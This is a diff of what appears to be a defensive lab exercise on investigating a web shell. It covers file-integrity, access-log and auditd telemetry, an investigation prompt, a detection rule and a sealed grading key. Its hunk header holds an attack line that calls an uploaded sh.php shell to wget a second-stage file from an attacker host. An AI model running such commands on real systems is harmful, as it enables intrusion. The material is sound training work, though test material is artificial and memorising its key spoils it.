@@ -29,15 +29,15 @@ curl 'http://10.10.10.20/hackable/uploads/sh.php?c=wget+http://10.10.10.5/lin-pe
 Revert to `baseline`.
 
 ## What telemetry this generates
-- **FIM**: real-time "file added" alert for `sh.php` in the upload dir — timestamped, with hash.
+- **FIM**: real-time "file added" alert for `sh.php` in the upload dir, timestamped and with a hash.
 - **Web access log**: the `POST` that uploaded it, then `GET ...sh.php?c=...` lines exposing every command as a URL parameter.
-- **auditd**: `id`, `cat`, `wget` executed by the `www-data` user — a web server spawning a shell is the tell.
+- **auditd**: `id`, `cat`, `wget` executed by the `www-data` user. A web server spawning a shell is the tell.
 
 ## Your investigation (fill cold)
-When did the shell file appear (FIM) and does that line up with a POST in the access log? What commands ran through it (decode the `c=` params)? Did the attacker pull a second-stage file? Is `www-data` executing shell commands — and would you have caught that without FIM? Confidence on "web shell, actively used": high or low, and why.
+When did the shell file appear (FIM) and does that line up with a POST in the access log? What commands ran through it (decode the `c=` params)? Did the attacker pull a second-stage file? Is `www-data` executing shell commands, and would you have caught that without FIM? Confidence on "web shell, actively used": high or low, and why.
 
 ## Detection engineering
-Correlate a FIM "file created in web root" with the same file being requested via GET within minutes — or an auditd rule flagging `www-data` spawning `sh`/`wget`/`curl`. Either is a strong web-shell detection; ship it.
+Correlate a FIM "file created in web root" with the same file being requested via GET within minutes, or an auditd rule flagging `www-data` spawning `sh`/`wget`/`curl`. Either one is a solid web-shell detection. Ship it.
 
 <details>
 <summary>Grading key — do not open until your verdict is written</summary>
